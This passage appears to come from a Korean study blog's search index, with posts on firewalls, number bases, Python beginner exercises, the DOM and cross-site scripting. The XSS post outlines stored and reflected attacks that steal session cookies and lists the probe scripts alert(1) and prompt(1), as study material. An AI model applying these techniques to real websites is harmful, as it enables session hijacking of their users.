역할신뢰 수준이 다른 네트워크 구간들 사이에 놓여서, 신뢰 수준이 낮은 네트워크로부터 오는 해로운 트래픽이 신뢰 수준이 높은 네트워크로 오지 못하게 막는다.3. 정책 기반의 방화벽방화벽은 다양한 수준의 정책으로 네트워크 간의 트래픽을 제어한다. 일반 수준의 정책 : 외부에서 내부로 전송되는 모든 트래픽을 차단하거나 허용 고급 수준의 정책 : “외부의 경쟁회사로부터 내부 서버로 오는, 길이 500byte 이상의 HTTP 트래픽을 허용하되 로그를 남긴다” 와 같은 복잡한 정책 4. 방화벽의 역사초기에는 네트워크 장비 중 하나인 라우터 (= Router) 가 방화벽의 역할을 전담했다.이후 외부 공격 형태가 다양해지고 치밀해짐에 따라 방화벽 기술도 그에 맞춰 진화했다. 1세대 방화벽 : 패킷 필터 2세대 방화벽 : 상태 기반 방화벽 (= Stateful) 3세대 방화벽 : 애플리케이션 방화벽 4-1. 패킷 필터패킷 자체만을 보고 미리 설정된 정책에 따라 허용 또는 거부를 결정하는 초창기 방화벽.방화벽 내부에서 세션을 관리하지 않는 기본 형태의 방화벽이다.특정한 IP를 허용 또는 거부하거나 특정한 포트를 허용 또는 거부하는 용도로 사용된다.4-2. 상태 기반 방화벽 (= Stateful)패킷 단위의 검사가 아닌, 세션 단위의 검사를 수행한다.4-3. 애플리케이션 방화벽초창기에는 네트워크를 기반으로 하던 공격 패턴이 점차 발달하여 일상적인 트래픽과 같은 특성을 가지면서 시스템을 공격하는 형태로 발전하게 되었다.패킷 필터 기반의 방화벽으로는 이러한 공격을 방어하기 어렵기 때문에, 애플리케이션 방화벽은 패킷의 내용을 검사하고 더 나아가 애플리케이션에 어떠한 영향을 미칠지 분석한다. ex) IPS, WAF, UTM5. 방화벽의 작동 원리기본적으로 방화벽은 모든 접근을 거부한 후, 허용할 접근만 단계적으로 허용하는 방식을 따른다.예를 들어, 방화벽은 약 65000개의 통신 포트 모두를 차단한 후 접근을 허용하는 특정 포트만을 열어둔다.통신 포트 뿐 아니라, 외부로부터 접근하는 IP 주소나 특정 프로그램에 따라 접근/거부 여부를 결정할 수 있다.이러한 보안 규칙 (= ACL) 설정이 모두 접근 제어 목록에 포함되어 일괄 적용된다.방화벽의 접근 제어 목록은 대개 관리자가 구성, 설정하기 편하도록 직관적인 형태로 출력되며, 보안 규칙 적용 즉시 결과를 확인할 수 있도록 제공된다." }, { "title": "Bit, Nibble, Byte 및 2진수, 10진수, 16진수", "url": "/posts/Bit-Nibble-Byte/", "categories": "Study, Computer", "tags": "", "date": "2021-11-29 00:00:00 +0900", "snippet": "Bit, Nibble, Byte 및 2진수, 10진수, 16진수 정리1. Bit0└ Bit (0~1)2. Nibble0000└ Nibble (0~15)3. Byte0000 0000└ Byte (0~255) 컴퓨터가 데이터를 저장하는 최소 단위4. Bit → Nibble → Byte0 or 1 = 1 Bit4 Bits = 1 Nibble8 Bits = 2 Nibbles = 1 Byte5. Byte 단위1000 Byte = 1 Kbyte (10³)1000 Kbyte = 1 Mbyte (10⁶)1000 Mbyte = 1 Gbyte (10⁹)1000 Gbyte = 1 Tbyte (10¹²)6. 2진수0, 1BinaryBit의 숫자체계컴퓨터는 전압이 있거나 없는 경우만 구별할 수 있다.7. 10진수0, 1, 2, 3, 4, 5, 6, 7, 8, 9Decimal일상생활의 숫자체계사람은 손가락이 10개이므로 10씩 끊어세는 것이 자연스럽다.8. 16진수0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, FHexadecimalNibble의 표현 단위10~15까지를 알파벳으로 대체하여 표현한다.9. 16진수를 사용하는 이유 2진수는 크기가 큰 데이터를 표현하기에는 적합하지 않음 → 0101011011110… 10진수 숫자를 나열하였을때 시작과 끝을 구분할 수 없음 → 12156345567342… 16진수로 표현했을 시 → 0xA4 = 1010 0100 = 1 Byte 가독성을 높이기 위한 것10. 0b vs 0x2진수 (Binary number) 를 표시할 경우 0b를 앞에 붙인다.16진수 (Hexadecimal number) 를 표시할 경우 0x를 앞에 붙인다. 170 = 0b10101010 = 0xAA" }, { "title": "Python 연습문제 만들기", "url": "/posts/Python-quiz/", "categories": "Study, Python", "tags": "", "date": "2021-11-28 00:00:00 +0900", "snippet": "Python 연습문제 만들기0. 요약 BMI 계산기 주민등록번호 입력 시 간단 신상 출력 몬스터 자동 공격 마스크 5부제 업다운 게임 학점 계산기 가위바위보 끝말잇기 정답에 가까운 사람이 승리하는 숫자 게임 폭탄 숫자 피하기 미래 예측 키 계산기 1. BMI 계산기문제) 신체질량지수인 BMI는 체중(kg)를 신장(m)의 제곱으로 나눈 값입니다. BMI 측정기를 만들고 임의의 체중과 신장을 넣어 출력해보세요.def bmi(kg, m): bmi = round(kg / m**2) #정수로 반올림 if bmi &amp;lt; 20: print(f&quot;BMI: {bmi}\\n당신은 저체중입니다.&quot;) elif bmi &amp;gt;= 20 and bmi &amp;lt;= 24: print(f&quot;BMI: {bmi}\\n당신은 정상입니다.&quot;) elif bmi &amp;gt;= 25 and bmi &amp;lt;= 29: print(f&quot;BMI: {bmi}\\n당신은 과체중입니다.&quot;) else: print(f&quot;BMI: {bmi}\\n당신은 비만입니다.&quot;)bmi(50.5, 1.55)pythonBMI: 21당신은 정상입니다.2. 주민등록번호 입력 시 간단 신상 출력문제) 주민등록번호를 인자로 입력받으면 생년월일과 성별을 출력하는 함수를 만들고 직접 인자를 넣어 실행해보세요. (주민등록번호 입력 시 ‘-‘을 포함합니다.)def my_info(regi): front = regi.split(&quot;-&quot;)[0] back = regi.split(&quot;-&quot;)[1] year = front[:2] month = front[2:4] day = front[4:] my_gen = back[:1] if int(my_gen)==1 or int(my_gen)==3: gender = &quot;남성&quot; else: gender = &quot;여성&quot; print_info(year, month, day, gender) def print_info(year, month, day, gender): first_two = 19 #연도 앞 두자리 if int(year[0]) &amp;lt;= 2: #00, 10, 20년대 first_two = 20 print(f&quot;저는 {first_two}{year}년 {month}월 {day}일에 태어난 {gender}입니다.&quot;) my_info(&quot;980220-2XXXXXX&quot;)my_info(&quot;011117-4XXXXXX&quot;)저는 1998년 02월 20일에 태어난 여성입니다.저는 2001년 11월 17일에 태어난 여성입니다.3. 몬스터 자동 공격문제) 몬스터의 체력이 0이 될 때까지 계속하여 공격하는 게임을 만들어보세요. 한번 공격할 때마다 플레이어의 레벨이 1씩 상승하고, 공격이 성공했다는 문구와 함께 현재 플레이어의 LV과 몬스터의 남은 체력을 출력합니다. (공격력 = 레벨 * 10)mon_hp = 100 #몬스터의 체력lv = 1 #플레이어 초기 LVattack = 10 #플레이어 초기 공격력i = 1while True: if i==1: #Welcome print(f&quot;현재 플레이어의 LV은 {lv}입니다.&quot;) print(&quot;게임을 시작합니다.&quot;) print(&quot;* * * * * * * * *&quot;) mon_hp -= attack lv += 1 if mon_hp &amp;lt;= 0: #몬스터 사망 시 mon_hp = 0 print(f&quot;공격에 성공하여 몬스터가 쓰러졌습니다!!\\n플레이어 LV: {lv}\\n몬스터 남은 체력: {mon_hp}&quot;) print(&quot;* * * * * * * * *&quot;) print(&quot;게임이 종료되었습니다.&quot;) break print(f&quot;{i}회 공격에 성공했습니다!\\n플레이어 LV: {lv}\\n몬스터 남은 체력: {mon_hp}&quot;) print(&quot;* * * * * * * * *&quot;) attack = lv * 10 #공격력 증가 i += 1현재 플레이어의 LV은 1입니다.게임을 시작합니다.* * * * * * * * *1회 공격에 성공했습니다!플레이어 LV: 2몬스터 남은 체력: 90* * * * * * * * *2회 공격에 성공했습니다!플레이어 LV: 3몬스터 남은 체력: 70* * * * * * * * *3회 공격에 성공했습니다!플레이어 LV: 4몬스터 남은 체력: 40* * * * * * * * *공격에 성공하여 몬스터가 쓰러졌습니다!!플레이어 LV: 5몬스터 남은 체력: 0* * * * * * * * *게임이 종료되었습니다.4. 마스크 5부제문제) 마스크 5부제는 생년의 끝자리를 기준으로 마스크를 구매할 수 있는 요일을 정한 제도입니다. 끝자리가 1, 6인 사람은 월요일, 2, 7인 사람은 화요일, 3, 8인 사람은 수요일, 4, 9인 사람은 목요일, 5, 0인 사람은 금요일에 구매할 수 있습니다. 사용자가 태어난 년도를 입력하면 사용자의 마스크 구매 가능 요일을 출력하게 만들어보세요.born = int(input(&quot;태어난 년도를 입력해주세요:&quot;)[3])def can_buy(day): print(f&quot;당신의 마스크 구입 가능 요일은 {day}입니다.&quot;) if born == 1 or born == 6: can_buy(&quot;월요일&quot;)elif born == 2 or born == 7: can_buy(&quot;화요일&quot;)elif born == 3 or born == 8: can_buy(&quot;수요일&quot;)elif born == 4 or born == 9: can_buy(&quot;목요일&quot;)else: can_buy(&quot;금요일&quot;)태어난 년도를 입력해주세요: 1998당신의 마스크 구입 가능 요일은 수요일입니다.5. 업다운 게임문제) 1부터 30까지의 정수 중 컴퓨터가 랜덤으로 정한 숫자를 알아맞히는 랜덤 숫자 게임을 만들어보세요. 정답이 아닐 시 사용자가 입력한 숫자보다 높은지(UP), 낮은지(DOWN) 알려주는 힌트를 출력해주세요. 게임이 종료되면 몇번만에 정답을 맞췄는지도 출력해보세요.import randomran = random.randrange(31)i = 1while True: if i == 1: guess = int(input(&quot;GUESS:&quot;)) else: guess = int(input(&quot;GUESS AGAIN:&quot;)) if ran &amp;gt; guess: print(&quot;&amp;gt;&amp;gt; UP..&quot;) elif ran &amp;lt; guess: print(&quot;&amp;gt;&amp;gt; DOWN..&quot;) else: print(&quot;&amp;gt;&amp;gt; YOU GOT IT!!&quot;) print(f&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; {i}번만에 게임이 종료되었습니다.&quot;) break i += 1GUESS: 15&amp;gt;&amp;gt; DOWN..GUESS AGAIN: 7&amp;gt;&amp;gt; DOWN..GUESS AGAIN: 5&amp;gt;&amp;gt; DOWN..GUESS AGAIN: 3&amp;gt;&amp;gt; UP..GUESS AGAIN: 4&amp;gt;&amp;gt; YOU GOT IT!!&amp;gt;&amp;gt;&amp;gt;&amp;gt; 5번만에 게임이 종료되었습니다.6. 학점 계산기문제) 사용자로부터 각 과목의 성적을 입력받은 후, 평점 평균을 계산하여 출력하게 만들어보세요. (단, 모든 과목은 학점수가 동일하며, 평점은 +, -, 0를 구분하여 4.3점 만점입니다.)#성적입력예시 : A+ B- C0 A0 B0 C+scores = input(&quot;이번 학기의 성적을 알려주세요 (공백으로 구분, 알파벳±0 형태로):&quot;).split(&quot; &quot;)total = 0def alpha(score): if score == &quot;A&quot;: alpha_score = 4 elif score == &quot;B&quot;: alpha_score = 3 elif score == &quot;C&quot;: alpha_score = 2 elif score == &quot;D&quot;: alpha_score = 1 else: alpha_score = 0 return alpha_scorefor score in scores: if score[1] == &quot;+&quot;: total += 0.3 total += alpha(score[0]) elif score[1] == &quot;-&quot;: total -= 0.3 total += alpha(score[0]) else: total += alpha(score[0]) print(f&quot;이번 학기의 평점 평균은 {round(total/len(scores), 2)}점입니다.&quot;)이번 학기의 성적을 알려주세요 (공백으로 구분, 알파벳±0 형태로): A+ A0 A- B+ B0 C+이번 학기의 평점 평균은 3.43점입니다.7. 가위바위보문제) 사용자로부터 선택지를 입력 받아, 컴퓨터와 가위바위보하는 게임을 만들어보세요. 동시에, 총 세번 먼저 이기면 최종 승리하는 삼세판 규칙을 구현해보세요.import randomglobal player_winplayer_win = 0global enemy_winenemy_win = 0def win(): print(&quot;&amp;gt;&amp;gt; Player가 승리했습니다!!&quot;) global player_win player_win += 1def draw(): print(&quot;비겼습니다.&quot;)def lose(): print(&quot;&amp;gt;&amp;gt; Enemy가 승리했습니다..&quot;) global enemy_win enemy_win += 1while True: print(f&quot;◆ Player {player_win} : {enemy_win} Enemy ◆&quot;) if player_win==3: print(&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; Player가 최종 승리했습니다!!!&quot;) break if enemy_win==3: print(&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; Enemy가 최종 승리했습니다...&quot;) break print(&quot;[1]가위 [2]바위 [3]보&quot;) player = int(input(&quot;Player:&quot;)) enemy = random.randrange(1, 4) choice = [&quot;가위&quot;, &quot;바위&quot;, &quot;보&quot;] print(f&quot;Player는 {choice[player-1]}, Enemy는 {choice[enemy-1]}를 선택했습니다!&quot;) if player==1: if enemy==1: draw() elif enemy==2: lose() else: win() elif player==2: if enemy==1: win() elif enemy==2: draw() else: lose() else: if enemy==1: lose() elif enemy==2: win() else: draw() print(&quot;* * * * * * * * * * * * * * * * * * * * *&quot;)◆ Player 0 : 0 Enemy ◆[1]가위 [2]바위 [3]보Player: 1Player는 가위, Enemy는 바위를 선택했습니다!&amp;gt;&amp;gt; Enemy가 승리했습니다..* * * * * * * * * * * * * * * * * * * * *◆ Player 0 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 1Player는 가위, Enemy는 보를 선택했습니다!&amp;gt;&amp;gt; Player가 승리했습니다!!* * * * * * * * * * * * * * * * * * * * *◆ Player 1 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 2Player는 바위, Enemy는 가위를 선택했습니다!&amp;gt;&amp;gt; Player가 승리했습니다!!* * * * * * * * * * * * * * * * * * * * *◆ Player 2 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 1Player는 가위, Enemy는 가위를 선택했습니다!비겼습니다.* * * * * * * * * * * * * * * * * * * * *◆ Player 2 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 3Player는 보, Enemy는 보를 선택했습니다!비겼습니다.* * * * * * * * * * * * * * * * * * * * *◆ Player 2 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 2Player는 바위, Enemy는 바위를 선택했습니다!비겼습니다.* * * * * * * * * * * * * * * * * * * * *◆ Player 2 : 1 Enemy ◆[1]가위 [2]바위 [3]보Player: 1Player는 가위, Enemy는 보를 선택했습니다!&amp;gt;&amp;gt; Player가 승리했습니다!!* * * * * * * * * * * * * * * * * * * * *◆ Player 3 : 1 Enemy ◆&amp;gt;&amp;gt;&amp;gt;&amp;gt; Player가 최종 승리했습니다!!!8. 끝말잇기문제) 사용자로부터 문자열을 입력 받아, 혼자서 하는 끝말잇기 게임을 만들어보세요. 단, 두음법칙은 적용되지 않으며, 이미 앞에서 사용한 단어이거나 답이 틀렸을 경우에는 게임이 종료되게 해주세요.while True: used = [] first = input(&quot;&amp;gt;&amp;gt; 첫번째 제시어를 입력해주세요:&quot;) used.append(first) second = input(f&quot;{first} →&quot;) if second in used: print(&quot;&amp;gt;&amp;gt; 이미 사용한 단어입니다!&quot;) print(&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; GAME OVER&quot;) break else: used.append(second) while True: if first[-1] == second[0]: first = second second = input(f&quot;{second} →&quot;) if second in used: print(&quot;&amp;gt;&amp;gt; 이미 사용한 단어입니다!&quot;) print(&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; GAME OVER&quot;) break else: used.append(second) else: print(&quot;&amp;gt;&amp;gt; 틀렸습니다!&quot;) print(&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt; GAME OVER&quot;) break break&amp;gt;&amp;gt; 첫번째 제시어를 입력해주세요: 기러기기러기 → 기차기차 → 차표차표 → 표범표범 → 범인범인 → 인간성인간성 → 성실성실 → 실기실기 → 기러기&amp;gt;&amp;gt; 이미 사용한 단어입니다!&amp;gt;&amp;gt;&amp;gt;&amp;gt; GAME OVER9. 정답에 가까운 사람이 승리하는 숫자 게임문제) 1부터 50까지의 숫자 중 랜덤으로 숫자 하나를 정답으로 정하고, 컴퓨터가 선택한 숫자와 사용자가 입력한 숫자를 비교하여 정답과 더 가까운 쪽이 승리하는 게임을 만들어보세요!import randomdef guess_game(): answer = random.randrange(1, 50) com_guess = random.randrange(1, 50) player_guess = int(input(&quot;정답을 맞춰보세요!:&quot;)) print(f&quot;컴퓨터는 {com_guess}를 선택했고, 플레이어는 {player_guess}를 선택했습니다.&quot;) com_diff = abs(answer-com_guess) player_diff = abs(answer-player_guess) print(f&quot;정답은 {answer}입니다.&quot;) if com_diff&amp;lt;player_diff: print(&quot;컴퓨터가 승리했습니다...&quot;) elif com_diff==player_diff: print(&quot;비겼습니다.&quot;) else: print(&quot;플레이어가 승리했습니다!&quot;) guess_game()정답을 맞춰보세요!: 27컴퓨터는 31를 선택했고, 플레이어는 27를 선택했습니다.정답은 30입니다.컴퓨터가 승리했습니다...10. 폭탄 숫자 피하기문제) 1부터 50까지의 숫자 중 폭탄 숫자를 10개 정하고, 컴퓨터와 사용자가 차례로 숫자 하나씩을 말해 폭탄 숫자를 먼저 말하게 되는 사람이 패배하는 게임을 만들어보세요.import randomdef bomb_game(): bomb = [] while len(bomb)&amp;lt;10: new = random.randrange(1, 50) if new not in bomb: bomb.append(new) else: continue i = 1 while True: print(f&quot;&amp;gt;&amp;gt; {i}번째 턴입니다.&quot;) com_guess = random.randrange(1, 50) print(f&quot;컴퓨터는 {com_guess}를 선택했습니다.&quot;) if com_guess in bomb: print(f&quot;&amp;gt;&amp;gt; {com_guess}은 폭탄이었습니다!&quot;) print(&quot;컴퓨터가 패배했습니다!&quot;) break player_guess = int(input(&quot;폭탄을 피하세요!:&quot;)) print(f&quot;플레이어는 {player_guess}를 선택했습니다.&quot;) if player_guess in bomb: print(f&quot;&amp;gt;&amp;gt; {player_guess}은 폭탄이었습니다!&quot;) print(&quot;플레이어가 패배했습니다...&quot;) break i += 1 bomb_game()&amp;gt;&amp;gt; 1번째 턴입니다.컴퓨터는 16를 선택했습니다.폭탄을 피하세요!: 24플레이어는 24를 선택했습니다.&amp;gt;&amp;gt; 2번째 턴입니다.컴퓨터는 33를 선택했습니다.&amp;gt;&amp;gt; 33은 폭탄이었습니다!컴퓨터가 패배했습니다!11. 미래 예측 키 계산기문제) 아이의 미래 예측 키는 엄마의 키와 아빠의 키의 평균에, 여자아이는 6.5cm를 빼고 남자아이는 6.5cm를 더하면 된다고 합니다. 엄마의 키와 아빠의 키, 아이의 성별을 입력받고 미래 예측 키를 출력하는 함수를 만드세요.def my_height(): mom = int(input(&quot;엄마의 키를 입력하세요:&quot;)) dad = int(input(&quot;아빠의 키를 입력하세요:&quot;)) aver = (mom+dad)/2 sex = input(&quot;여자아이면 F, 남자아이면 M을 입력하세요:&quot;) if sex==&quot;F&quot;: height = aver-6.5 elif sex==&quot;M&quot;: height = aver+6.5 print(f&quot;아이의 미래 예측 키는 {height}cm입니다.&quot;) my_height()엄마의 키를 입력하세요: 150아빠의 키를 입력하세요: 170여자아이면 F, 남자아이면 M을 입력하세요: M아이의 미래 예측 키는 166.5cm입니다." }, { "title": "DOM (The Document Object Model)", "url": "/posts/DOM/", "categories": "Study, Computer", "tags": "", "date": "2021-11-21 00:00:00 +0900", "snippet": "DOM 관련 기초 개념1. DOM의 사전적 정의문서 객체 모델 (The Document Object Model, DOM) 은 HTML, XML 문서의 프로그래밍 인터페이스다. 인터페이스 : 상호 간의 소통을 위해 만들어진 물리적 매개체나 프로토콜2. DOM의 종류W3C DOM 표준은 다음의 세 가지 모델로 구분된다. W3C : World Wide Web Consortium Core DOM : 모든 문서 타입을 위한 DOM 모델 HTML DOM : HTML 문서를 위한 DOM 모델 XML DOM : XML 문서를 위한 DOM 모델 3. HTML이란?Hypertext Markup Language4. XML이란?eXtensible Markup Language = 확장 가능한 표시 언어Markup Language의 다른 예로는 우리가 아는 언어인 HTML이 있다.5. HTML vs XMLHTML은 이미 약속되어있는 태그만 사용이 가능하다. (ex. &amp;lt;h1&amp;gt;, &amp;lt;h2&amp;gt;…)반면, XML은 이름 그대로 ‘확장 가능하다’는 차이점이 있다.XML의 태그는 사용자가 임의로 만들어 사용할 수 있다.XML은 어떠한 데이터를 설명하기 위해 임의로 만든 태그로 해당 데이터를 감싼다.즉, 태그를 통해 데이터를 설명하는 것이다.6. XML의 특징 다목적 마크업 언어이다. 다른 시스템끼리 다양한 종류의 데이터를 손쉽게 교환할 수 있도록 해준다. 새로운 태그를 만들어 추가해도 계속해서 동작하므로, 확장성이 좋다. 데이터를 전달하고 저장하는 것만을 목적으로 한다. 텍스트 데이터 형식의 언어로, 모든 XML 문서는 유니코드* 문자로만 이루어진다. 유니코드 : 숫자와 글자, 즉 키와 값이 1:1로 매핑된 형태의 코드7. XML 데이터 예시&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot; ?&amp;gt;&amp;lt;note&amp;gt; &amp;lt;date&amp;gt; &amp;lt;day&amp;gt;21&amp;lt;/day&amp;gt; &amp;lt;month&amp;gt;11&amp;lt;/month&amp;gt; &amp;lt;year&amp;gt;2021&amp;lt;/year&amp;gt; &amp;lt;/date&amp;gt; &amp;lt;tistory&amp;gt; &amp;lt;title&amp;gt;XML은 무엇인가&amp;lt;/title&amp;gt; &amp;lt;writer&amp;gt;choco&amp;lt;/writer&amp;gt; &amp;lt;/tistory&amp;gt; &amp;lt;remark&amp;gt; &amp;lt;![CDATA[ CDATA부분에는 &amp;lt; &amp;gt; &amp;amp; &quot; 등과 같은 문자를 그대로 표현할 수 있다 ]]&amp;gt; &amp;lt;/remark&amp;gt; &amp;lt;/note&amp;gt;DOM (The Document Object Model)1. DOM이란 정확히 뭘까?DOM은 웹 페이지에 대한 인터페이스로, 문서 내의 모든 요소를 정의하고 다양한 프로그램들이 페이지의 컨텐츠, 구조 및 스타일을 읽고 조작할 수 있도록 API를 제공하는 일종의 객체 모델이다.2. 웹 페이지 빌드 과정에서의 DOM의 쓰임새웹 브라우저가 원본 HTML 문서를 읽어들인 후, 스타일을 입히고 대화형 페이지로 만들어 뷰 포트에 표시하기까지의 과정을 Critical Rendering Path라고 한다. 이 과정은 여러 단계로 나누어져 있지만, 이 단계들을 대략 두 단계로 나눌 수 있다. 브라우저는 읽어들인 문서를 파싱하여 최종적으로 어떤 내용을 페이지에 렌더링할지 결정한다. 브라우저는 해당 렌더링을 수행한다. 1단계를 거치면 Render Tree가 생성된다.Render Tree는 웹 페이지에 표시될 HTML 요소들과 이와 관련된 스타일 요소들로 구성된다. 브라우저는 Render Tree를 생성하기 위해 다음의 두 모델을 필요로 한다. DOM (The Document Object Model) : HTML 요소들의 구조화된 표현 CSSOM (Cascading Style Sheets Object Model) : 요소들과 연관된 스타일 정보의 구조화된 표현 3. DOM의 구조DOM은 원본 HTML의 객체 기반 표현 방식이다. 둘은 서로 비슷하지만, DOM이 갖고 있는 근본적인 차이는 단순 텍스트로 구성된 HTML의 내용과 구조가 객체 모델로 변환되어 다양한 프로그램에서 사용될 수 있다는 점이다.DOM의 개체 구조는 Node Tree로 표현된다. 하나의 부모 줄기가 여러 개의 자식 나뭇가지를 갖고 있고, 또 각각의 나뭇가지는 잎들을 가질 수 있는, 통틀어 나무와 같은 구조로 이루어져 있기 때문이다.이러한 DOM은 W3C의 표준 객체 모델이며, 예시는 다음과 같다.4. Node란?Tree 구조에서 Root Node를 포함한 모든 개개의 개체를 Node라고 표현한다.head, body, title, script, h1 등의 태그 뿐만 아니라 태그 안의 텍스트나 속성 등도 모두 Node에 속한다.5. JavaScript &amp;amp; DOMJavaScript는 DOM을 이용하여 다음과 같은 작업을 할 수 있다. 새로운 HTML 요소나 속성을 추가할 수 있다. 존재하는 HTML 요소나 속성을 제거할 수 있다. HTML 문서의 모든 HTML 요소를 변경할 수 있다. HTML 문서의 모든 HTML 속성을 변경할 수 있다. HTML 문서의 모든 CSS 스타일을 변경할 수 있다. HTML 문서에 새로운 HTML 이벤트를 추가할 수 있다. HTML 문서의 모든 HTML 이벤트에 반응할 수 있다. 6. JavaScript vs DOMJavaScript는 브라우저가 읽고 어떤 작업을 수행할 수 있는 언어이고,DOM은 이 작업이 이루어지는 장소를 말한다.사실 우리가 ‘JS로 하는 것’이라고 생각하는 것은 정확히는 ‘DOM API’다.DOM은 브라우저에 의해 기록되는 모든 것이고, JS는 이를 조작할 수 있는 언어일 뿐이다.따라서 JS는 브라우저 밖의 DOM API가 없는 환경에서도 동작할 수 있다. (ex. Node.js 등)7. JavaScript로 문서 객체를 생성한다는 것은 어떤 의미일까?문서 객체가 생성되는 방식은 두 가지로 나누어 볼 수 있다. 정적 생성 : 브라우저가 HTML에 적혀져 있는 태그를 읽고 있는 그대로 문서 객체를 생성하는 것. 동적 생성 : 원본 HTML에 없는 문서 객체를 JS를 이용하여 생성하는 것. 따라서 JS로 문서 객체를 생성하는 것은 동적 생성에 해당한다.DOM이 아닌 것들1. 내가 작성한 HTML 코드가 DOM이다? 아니다! 하지만 내가 작성한 코드가 브라우저에 의해 파싱되면 DOM이 된다.2. 페이지 View Source가 DOM이다? 아니다! View Source는 해당 페이지를 이루고 있는 HTML을 보여줄 뿐이며, 내가 작성한 HTML과 같다. 그러나, 만약 코드 작성 시 백엔드 언어를 사용했을 시에는 컴파일된 결과가 출력된다. 예를 들면, 코드에 &amp;lt;?=$res[0]?&amp;gt; 라고 작성했더라도 View Source에는 컴파일된 결과인 해당 데이터 값이 나타난다. 혹은 작성된 코드에 대해 빌드 과정을 거친 다음 웹 사이트에 배포되는 경우에는, HTML 코드가 압축되거나 변형되었을 수도 있다.3. DevTools에서 보이는 코드가 DOM이다? 유사하다! 브라우저에서 지원하는 개발자 도구는 DOM과 가장 가까운 근사치를 제공해준다. 이 도구에서 시각적으로 표현한 DOM이 나의 HTML 코드와 동일할 수는 있지만, 대개는 달라지게 되며 DevTools에는 이러한 변경 사항이 적용되어 표시된다. 그러나 DevTools에서 보이는 코드가 DOM과 완전히 같지는 않다. DOM에는 없더라도, 우리에게 정보를 주기 위해 추가적으로 포함하는 것들이 있기 때문이다. (ex. CSS의 pseudo element 등) DOM이 HTML과 달라지는 경우1. 작성된 HTML이 유효하지 않은 경우 내가 작성한 HTML에 실수가 있는 경우, 브라우저는 유효하지 않은 HTML 코드를 올바르게 교정해준다.2. Javascript로 DOM을 조작하는 경우 예시는 다음과 같다.[1] 다음의 HTML 코드를 작성한다.&amp;lt;div id=&quot;container&quot;&amp;gt;&amp;lt;/div&amp;gt;[2] 다음의 JS를 작성하여 container에 텍스트를 추가한다.&amp;lt;script&amp;gt; var container = document.getElementById(&quot;container&quot;); container.innerHTML = &quot;New Content!&quot;;&amp;lt;/script&amp;gt;[3] DevTools를 확인하면 DOM은 다음과 같이 나타난다.&amp;lt;div id=&quot;container&quot;&amp;gt;New Content!&amp;lt;/div&amp;gt;따라서 DOM은 원본 HTML 혹은 View Source와는 다르다.이외. Ajax and Templating Ajax를 통해 어딘가에서 컨텐츠를 가져와서 현재 페이지에 넣거나, 클라이언트 사이드 템플리팅을 사용하는 경우에도 원본 HTML과는 달라진다." }, { "title": "XSS (Cross-Site Scripting)", "url": "/posts/XSS/", "categories": "Study, Webhacking", "tags": "", "date": "2021-11-20 00:00:00 +0900", "snippet": "XSS (Cross-Site Scripting)1. XSS란?크로스 사이트 스크립팅 공격은공격자가 악의적인 스크립트를 웹 애플리케이션에 삽입한 후웹 사용자의 웹 브라우저에서 해당 스크립트가 실행되도록 만드는 공격이다.2. 다른 공격들과의 차이점다른 공격들은 취약점을 갖고 있는 서버측을 공격하지만XSS는 서버의 취약점을 이용하여 클라이언트측을 공격한다.3. XSS의 종류기준 : 공격자가 삽입한 스크립트 코드가 언제 실행되는지에 따라 구분된다. Stored XSS : 서버에 저장 Reflected XSS : 서버에서 반사 Dom Based XSS : 클라이언트 측에서 조립 4. XSS의 주요 피해 사례 세션 쿠키 탈취 시스템 관리자 권한 탈취 악성코드 다운로드 5. XSS의 발생 가능 위치사용자의 입력이 서버의 응답에 포함되는 모든 곳에서 발생 가능하다.6. POC Script alert(1) : 알림 띄우기 prompt(1) : 대화상자 띄우기 Stored XSS1. 특징 스크립트가 웹 서버에 저장되었다가 실행된다. 웹 서버에 저장되기 때문에 피싱 과정이 필요 없다. 스크립트가 삽입되는 곳과 삽입한 스크립트가 실행되는 곳이 다르다. 해당 페이지를 접속하는 모든 사용자가 공격당할 수 있기 때문에 Reflected XSS 비해 더 심각하다. 2. Stored XSS 시나리오 공격자는 웹 사이트의 방명록 등에 악의적인 스크립트를 삽입한 글을 남긴다. 다른 사용자들이 방명록을 방문하여 공격자가 작성한 게시물을 읽는다. 이때 게시물에 저장되어 있던 스크립트가 사용자에게로 전달된다. 웹 브라우저는 스크립트를 실행하여 세션 쿠키가 공격자에게 전달된다. 공격자는 세션 쿠키를 이용하여 해당 사용자 권한으로 웹사이트를 접속한다. 3. Stored XSS 절차 삽입한 글자들이 출력되는 곳을 확인한다. HTML 특수문자를 필터링하는지 확인한다. POC Script를 삽입한다. Reflected XSS1. 특징 스크립트를 웹 서버에 저장하지 않는다. 웹 서버에서 반사되는 데이터를 활용한다. 피싱 과정을 필요로 한다. 스크립트를 삽입하는 곳과 삽입된 스크립트가 응답되는 곳이 같다. URL을 통해 공격한다. 2. Reflected XSS 먼저, 공격자는 이메일 등을 이용하여 피해자를 피싱한다. 이메일 뿐만 아니라 게시판, SNS 등 공격자가 링크를 남길 수 있는 곳이면 어디든 피싱에 이용할 수 있다. 피싱 시, 세션 쿠키를 탈취하는 스크립트를 삽입한 HTTP 요청 링크를 포함시킨다. 피해자가 이 링크를 클릭하게 되면 스크립트가 삽입된 요청이 웹 사이트로 전송된다. 이때 Reflected XSS 취약점이 있는 웹 사이트는 입력된 스크립트를 반사하여 그대로 웹 페이지에 출력한다. 웹 페이지를 읽는 웹 브라우저는 자동으로 스크립트를 실행하게 되고, 그 결과 세션 쿠키를 공격자에게 전달한다. 공격자가 이 세션 쿠키를 사용하면 해당 피해자의 권한으로 접속할 수 있게 된다. 3. Reflected XSS 절차 삽입한 글자들이 출력되는 곳을 확인한다. HTML 특수문자를 필터링하는지 확인한다. POC Script를 삽입한다. DOM Based XSS1. 특징 클라이언트 측 브라우저에서 조립된다. 웹 서버와 관계없이 브라우저에서 발생한다. 웹 서버에서 전송된 